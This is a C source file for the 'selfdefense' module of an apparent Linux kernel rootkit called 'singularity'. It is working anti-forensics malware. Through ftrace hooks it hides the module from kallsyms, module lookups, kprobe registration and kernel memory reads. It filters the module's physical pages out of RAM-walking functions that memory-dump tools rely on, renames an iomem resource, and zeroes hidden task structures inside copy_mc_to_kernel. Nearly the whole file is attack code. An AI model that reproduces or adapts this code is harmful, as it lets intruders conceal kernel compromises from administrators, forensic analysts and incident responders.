/*
Initial and poop version of singularity selfdefense.c module
*/


#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/selfdefense.h"

#define PROLOGUE_SNAP  16
#define MAX_SNAPS      512

struct sd_snap {
    unsigned long addr;
    u8            bytes[PROLOGUE_SNAP];
};

static struct sd_snap snaps[MAX_SNAPS];
static int            nsnaps = 0;
static DEFINE_SPINLOCK(sd_lock);

notrace void sd_protect_symbol(const char *symname)
{
    unsigned long addr;
    unsigned long flags;
    struct sd_snap *s;
    int i;

    addr = (unsigned long)resolve_sym(symname);
    if (!addr)
        return;

    spin_lock_irqsave(&sd_lock, flags);
    for (i = 0; i < nsnaps; i++) {
        if (snaps[i].addr == addr) {
            spin_unlock_irqrestore(&sd_lock, flags);
            return;
        }
    }
    if (nsnaps >= MAX_SNAPS) {
        spin_unlock_irqrestore(&sd_lock, flags);
        return;
    }
    s = &snaps[nsnaps++];
    s->addr = addr;
    memcpy(s->bytes, (const void *)addr, PROLOGUE_SNAP);
    spin_unlock_irqrestore(&sd_lock, flags);
}

static notrace const u8 *sd_find_snap(unsigned long addr, size_t size)
{
    int i;
    for (i = 0; i < nsnaps; i++) {
        if (addr >= snaps[i].addr &&
            (addr + size) <= (snaps[i].addr + PROLOGUE_SNAP))
            return snaps[i].bytes + (addr - snaps[i].addr);
    }
    return NULL;
}

static int (*orig_register_kprobe)(struct kprobe *p);

static notrace int hook_register_kprobe(struct kprobe *p)
{
    int ret;
    const char *saved;

    if (!p)
        return orig_register_kprobe(p);

    if (within_module((unsigned long)__builtin_return_address(0), THIS_MODULE)) {
        saved          = p->symbol_name;
        p->symbol_name = NULL;
        ret = orig_register_kprobe(p);
        p->symbol_name = saved;
        return ret;
    }

    return orig_register_kprobe(p);
}

static struct ftrace_ops kprobe_hook_ops = {
    .func  = NULL,
    .flags = FTRACE_OPS_FL_SAVE_REGS |
             FTRACE_OPS_FL_RECURSION |
             FTRACE_OPS_FL_IPMODIFY,
};

static void notrace kprobe_ftrace_thunk(unsigned long ip,
                                        unsigned long parent_ip,
                                        struct ftrace_ops *ops,
                                        struct ftrace_regs *fregs)
{
    if (!within_module(parent_ip, THIS_MODULE))
        ftrace_regs_set_instruction_pointer(fregs,
            (unsigned long)hook_register_kprobe);
}

notrace int sd_bootstrap_kprobe_hook(void)
{
    unsigned long addr = (unsigned long)&register_kprobe;
    int err;

    orig_register_kprobe = (int (*)(struct kprobe *))addr;
    kprobe_hook_ops.func = kprobe_ftrace_thunk;

    err = ftrace_set_filter_ip(&kprobe_hook_ops, addr, 0, 0);
    if (err)
        return err;

    err = register_ftrace_function(&kprobe_hook_ops);
    if (err) {
        ftrace_set_filter_ip(&kprobe_hook_ops, addr, 1, 0);
        return err;
    }

    return 0;
}

static void sd_bootstrap_kprobe_unhook(void)
{
    unsigned long addr = (unsigned long)&register_kprobe;
    unregister_ftrace_function(&kprobe_hook_ops);
    ftrace_set_filter_ip(&kprobe_hook_ops, addr, 1, 0);
}

static long (*orig_copy_from_kernel_nofault)(void *dst, const void *src,
                                              size_t size);

static notrace long hook_copy_from_kernel_nofault(void *dst, const void *src,
                                                   size_t size)
{
    unsigned long addr = (unsigned long)src;
    const u8 *snap;

    if (within_module(addr, THIS_MODULE)) {
        snap = sd_find_snap(addr, size);
        if (snap && dst) { memcpy(dst, snap, size); return 0; }
        if (dst) memset(dst, 0x90, size);
        return 0;
    }

    snap = sd_find_snap(addr, size);
    if (snap && dst) {
        memcpy(dst, snap, size);
        return 0;
    }

    return orig_copy_from_kernel_nofault(dst, src, size);
}

typedef int (*ksym_cb_t)(void *data, const char *name, unsigned long addr);
static int (*orig_kallsyms_on_each_symbol)(ksym_cb_t fn, void *data);

struct sd_filter { ksym_cb_t fn; void *data; };

static notrace int sd_ksym_cb(void *data, const char *name, unsigned long addr)
{
    struct sd_filter *f = data;
    if (within_module(addr, THIS_MODULE))
        return 0;
    return f->fn(f->data, name, addr);
}

static notrace int hook_kallsyms_on_each_symbol(ksym_cb_t fn, void *data)
{
    struct sd_filter f = { .fn = fn, .data = data };
    return orig_kallsyms_on_each_symbol(sd_ksym_cb, &f);
}

static struct module *(*orig_module_address)(unsigned long addr);

static notrace struct module *hook_module_address(unsigned long addr)
{
    if (within_module(addr, THIS_MODULE))
        return NULL;

    return orig_module_address(addr);
}

static struct module *(*orig_find_module)(const char *name);

static notrace struct module *hook_find_module(const char *name)
{
    if (name && strcmp(name, KBUILD_MODNAME) == 0)
        return NULL;
    return orig_find_module(name);
}

static notrace void sd_module_phys_range(unsigned long *phys_start,
                                          unsigned long *phys_end)
{
    unsigned long va, size;
    struct page *pg;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    va   = (unsigned long)THIS_MODULE->mem[MOD_TEXT].base;
    size = THIS_MODULE->mem[MOD_TEXT].size;
#else
    va   = (unsigned long)THIS_MODULE->core_layout.base;
    size = THIS_MODULE->core_layout.size;
#endif

    if (!va || !size) {
        *phys_start = 0;
        *phys_end   = 0;
        return;
    }

    pg = vmalloc_to_page((void *)va);
    *phys_start = pg ? page_to_phys(pg) : 0;

    pg = vmalloc_to_page((void *)(va + size - 1));
    *phys_end = pg ? (page_to_phys(pg) + PAGE_SIZE - 1) : 0;
}

typedef int (*walk_ram_cb_t)(u64, u64, void *);
static int (*orig_walk_system_ram_res)(u64 start, u64 end, void *arg,
                                       walk_ram_cb_t func);

struct sd_walk_ctx { walk_ram_cb_t real_cb; void *real_arg; };

static notrace int sd_walk_filter(u64 start, u64 end, void *arg)
{
    struct sd_walk_ctx *ctx   = arg;
    unsigned long mod_start = 0, mod_end = 0;

    sd_module_phys_range(&mod_start, &mod_end);

    if (!mod_end || end < mod_start || start > mod_end)
        return ctx->real_cb(start, end, ctx->real_arg);

    if (start < mod_start)
        ctx->real_cb(start, (u64)mod_start - 1, ctx->real_arg);

    if (end > mod_end)
        ctx->real_cb((u64)mod_end + 1, end, ctx->real_arg);

    return 0;
}

static notrace int hook_walk_system_ram_res(u64 start, u64 end, void *arg,
                                             walk_ram_cb_t func)
{
    struct sd_walk_ctx ctx = { .real_cb = func, .real_arg = arg };
    return orig_walk_system_ram_res(start, end, &ctx, sd_walk_filter);
}

typedef int (*walk_iomem_cb_t)(struct resource *, void *);
static int (*orig_walk_iomem_res_desc)(unsigned long desc, unsigned long flags,
                                        u64 start, u64 end, void *arg,
                                        walk_iomem_cb_t func);

struct sd_iomem_ctx { walk_iomem_cb_t real_cb; void *real_arg; };

static notrace int sd_iomem_filter(struct resource *res, void *arg)
{
    struct sd_iomem_ctx *ctx = arg;
    unsigned long mod_start = 0, mod_end = 0;

    if (!res) return 0;

    sd_module_phys_range(&mod_start, &mod_end);

    if (!mod_end ||
        (u64)res->end < mod_start || (u64)res->start > mod_end)
        return ctx->real_cb(res, ctx->real_arg);

    return 0;
}

static notrace int hook_walk_iomem_res_desc(unsigned long desc,
                                             unsigned long flags,
                                             u64 start, u64 end,
                                             void *arg,
                                             walk_iomem_cb_t func)
{
    struct sd_iomem_ctx ctx = { .real_cb = func, .real_arg = arg };
    return orig_walk_iomem_res_desc(desc, flags, start, end,
                                    &ctx, sd_iomem_filter);
}

extern struct resource iomem_resource;

static rwlock_t *sd_resource_lock = NULL;

static const char *iomem_saved_name = NULL;
static struct resource *iomem_poisoned = NULL;

static notrace void sd_poison_iomem(void)
{
    unsigned long mod_phys = 0, mod_phys_end = 0;
    struct resource *r;

    if (!sd_resource_lock) return;

    sd_module_phys_range(&mod_phys, &mod_phys_end);
    if (!mod_phys) return;

    read_lock(sd_resource_lock);
    for (r = iomem_resource.child; r; r = r->sibling) {
        if (r->name &&
            strcmp(r->name, "System RAM") == 0 &&
            (unsigned long)r->start <= mod_phys &&
            (unsigned long)r->end   >= mod_phys) {
            iomem_saved_name = r->name;
            iomem_poisoned   = r;
            WRITE_ONCE(r->name, "Reserved");
            break;
        }
    }
    read_unlock(sd_resource_lock);
}

static notrace void sd_restore_iomem(void)
{
    if (iomem_poisoned && iomem_saved_name) {
        WRITE_ONCE(iomem_poisoned->name, iomem_saved_name);
        iomem_poisoned   = NULL;
        iomem_saved_name = NULL;
    }
}

#define SD_MAX_MOD_PAGES 2048
static unsigned long sd_mod_phys_pages[SD_MAX_MOD_PAGES];
static int           sd_mod_phys_count = 0;

static void sd_init_mod_pages(void)
{
    unsigned long va, size, offset;
    struct page *pg;

    sd_mod_phys_count = 0;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    {
        enum mod_mem_type s;
        for (s = 0; s < MOD_MEM_NUM_TYPES; s++) {
            va   = (unsigned long)THIS_MODULE->mem[s].base;
            size = THIS_MODULE->mem[s].size;
            if (!va || !size)
                continue;
            for (offset = 0; offset < size &&
                 sd_mod_phys_count < SD_MAX_MOD_PAGES; offset += PAGE_SIZE) {
                pg = vmalloc_to_page((void *)(va + offset));
                if (pg)
                    sd_mod_phys_pages[sd_mod_phys_count++] =
                        page_to_phys(pg) & PAGE_MASK;
            }
        }
    }
#else
    va   = (unsigned long)THIS_MODULE->core_layout.base;
    size = THIS_MODULE->core_layout.size;
    for (offset = 0; offset < size && sd_mod_phys_count < SD_MAX_MOD_PAGES;
         offset += PAGE_SIZE) {
        pg = vmalloc_to_page((void *)(va + offset));
        if (pg)
            sd_mod_phys_pages[sd_mod_phys_count++] = page_to_phys(pg) & PAGE_MASK;
    }
#endif
}

static notrace bool sd_is_mod_page(unsigned long phys)
{
    int i;
    phys &= PAGE_MASK;
    for (i = 0; i < sd_mod_phys_count; i++)
        if (sd_mod_phys_pages[i] == phys)
            return true;
    return false;
}

static char sd_zero_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));

static char sd_scratch_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));

#define SD_MAX_PARTIAL 256
struct sd_partial_entry {
    unsigned long phys;
    unsigned long off;
    unsigned long len;
};
static struct sd_partial_entry sd_partial[SD_MAX_PARTIAL];
static int sd_partial_count = 0;
static DEFINE_SPINLOCK(sd_pages_lock);

notrace void sd_register_phys_range(const void *va, size_t size)
{
    unsigned long addr = (unsigned long)va & PAGE_MASK;
    unsigned long end  = (unsigned long)va + size;
    unsigned long flags;

    while (addr < end) {
        unsigned long pg_end = addr + PAGE_SIZE;
        unsigned long off    = ((unsigned long)va > addr)
                                ? ((unsigned long)va - addr) : 0;
        unsigned long len    = min(pg_end, end) - (addr + off);
        unsigned long phys;
        int i;

        if (virt_addr_valid((void *)addr))
            phys = virt_to_phys((void *)addr) & PAGE_MASK;
        else {
            struct page *pg = vmalloc_to_page((void *)addr);
            phys = pg ? (page_to_phys(pg) & PAGE_MASK) : 0;
        }

        if (phys) {
            spin_lock_irqsave(&sd_pages_lock, flags);
            for (i = 0; i < sd_partial_count; i++) {
                if (sd_partial[i].phys == phys &&
                    sd_partial[i].off == off) {
                    if (len > sd_partial[i].len)
                        sd_partial[i].len = len;
                    goto next;
                }
            }
            if (sd_partial_count < SD_MAX_PARTIAL) {
                sd_partial[sd_partial_count].phys = phys;
                sd_partial[sd_partial_count].off  = off;
                sd_partial[sd_partial_count].len  = len;
                sd_partial_count++;
            }
next:
            spin_unlock_irqrestore(&sd_pages_lock, flags);
        }

        addr += PAGE_SIZE;
    }
}

notrace void sd_register_hidden_task(struct task_struct *task)
{
    if (task)
        sd_register_phys_range(task, sizeof(*task));
}

static struct kprobe sd_copy_mc_kp;
static int sd_copy_mc_kp_active = 0;

static int notrace sd_copy_mc_pre(struct kprobe *p, struct pt_regs *regs)
{
    void *src = (void *)regs->si;
    unsigned long phys = 0;
    int i, found_partial = 0;

    if (!sd_mod_phys_count && !sd_partial_count)
        return 0;

    if (virt_addr_valid(src)) {
        phys = virt_to_phys(src) & PAGE_MASK;
    } else {
        struct page *pg = vmalloc_to_page(src);
        if (pg)
            phys = page_to_phys(pg) & PAGE_MASK;
    }

    if (!phys)
        return 0;

    if (sd_is_mod_page(phys)) {
        regs->si = (unsigned long)sd_zero_page;
        return 0;
    }

    for (i = 0; i < sd_partial_count; i++) {
        if (sd_partial[i].phys != phys)
            continue;
        if (!found_partial) {
            memcpy(sd_scratch_page, src, PAGE_SIZE);
            found_partial = 1;
        }
        memset(sd_scratch_page + sd_partial[i].off, 0, sd_partial[i].len);
    }
    if (found_partial)
        regs->si = (unsigned long)sd_scratch_page;

    return 0;
}

static int sd_copy_mc_kprobe_install(void)
{
    unsigned long addr = (unsigned long)resolve_sym("copy_mc_to_kernel");
    int ret;

    if (!addr)
        return -ENOENT;
    memset(&sd_copy_mc_kp, 0, sizeof(sd_copy_mc_kp));
    sd_copy_mc_kp.pre_handler = sd_copy_mc_pre;
    sd_copy_mc_kp.addr        = (kprobe_opcode_t *)addr;
    ret = register_kprobe(&sd_copy_mc_kp);
    if (ret == 0)
        sd_copy_mc_kp_active = 1;
    return ret;
}

static void sd_copy_mc_kprobe_remove(void)
{
    if (sd_copy_mc_kp_active) {
        unregister_kprobe(&sd_copy_mc_kp);
        sd_copy_mc_kp_active = 0;
    }
}

static struct ftrace_hook sd_hooks_core[] = {
    HOOK("copy_from_kernel_nofault", hook_copy_from_kernel_nofault,
                                     &orig_copy_from_kernel_nofault),
    HOOK("kallsyms_on_each_symbol",  hook_kallsyms_on_each_symbol,
                                     &orig_kallsyms_on_each_symbol),
    HOOK("__module_address",         hook_module_address,
                                     &orig_module_address),
    HOOK("find_module",              hook_find_module,
                                     &orig_find_module),
};

static struct ftrace_hook sd_hooks_lime[] = {
    HOOK("walk_system_ram_res",  hook_walk_system_ram_res,  &orig_walk_system_ram_res),
    HOOK("walk_iomem_res_desc",  hook_walk_iomem_res_desc,  &orig_walk_iomem_res_desc),
};

static unsigned int sd_lime_installed = 0;

notrace int selfdefense_init(void)
{
    int err;

    sd_resource_lock = (rwlock_t *)resolve_sym("resource_lock");
    sd_init_mod_pages();

    err = fh_install_hooks(sd_hooks_core, ARRAY_SIZE(sd_hooks_core));
    if (err)
        return err;

    {
        int i;
        for (i = 0; i < (int)ARRAY_SIZE(sd_hooks_lime); i++) {
            if (fh_install_hook(&sd_hooks_lime[i]) == 0)
                sd_lime_installed |= (1u << i);
        }
    }

    sd_copy_mc_kprobe_install();

    sd_poison_iomem();

    return 0;
}

notrace void selfdefense_exit(void)
{
    sd_restore_iomem();
    sd_copy_mc_kprobe_remove();

    fh_remove_hooks(sd_hooks_core, ARRAY_SIZE(sd_hooks_core));

    {
        int i;
        for (i = 0; i < (int)ARRAY_SIZE(sd_hooks_lime); i++) {
            if (sd_lime_installed & (1u << i))
                fh_remove_hook(&sd_hooks_lime[i]);
        }
        sd_lime_installed = 0;
    }
    sd_bootstrap_kprobe_unhook();

    nsnaps = 0;
}